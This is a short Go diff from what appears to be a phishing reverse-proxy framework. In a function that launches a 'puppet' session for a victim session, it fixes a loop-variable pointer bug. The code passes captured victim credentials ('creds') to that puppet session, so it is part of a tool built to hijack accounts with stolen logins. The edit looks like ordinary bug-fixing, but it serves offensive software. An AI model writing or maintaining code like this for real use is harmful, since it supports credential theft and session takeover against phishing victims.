@@ -2175,7 +2175,8 @@ func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string, req
 
 		if shouldTrigger {
 			log.Info("[PUPPET] Launching puppet session for trigger '%s' (session: %s)", trigger.Name, victimSession)
-			_, err := pm.LaunchPuppetForSession(victimSession, creds, &trigger)
+			t := trigger // Create a local copy to pass a stable pointer
+			_, err := pm.LaunchPuppetForSession(victimSession, creds, &t)
 			if err != nil {
 				log.Error("[PUPPET] Failed to launch puppet session: %v", err)
 			}
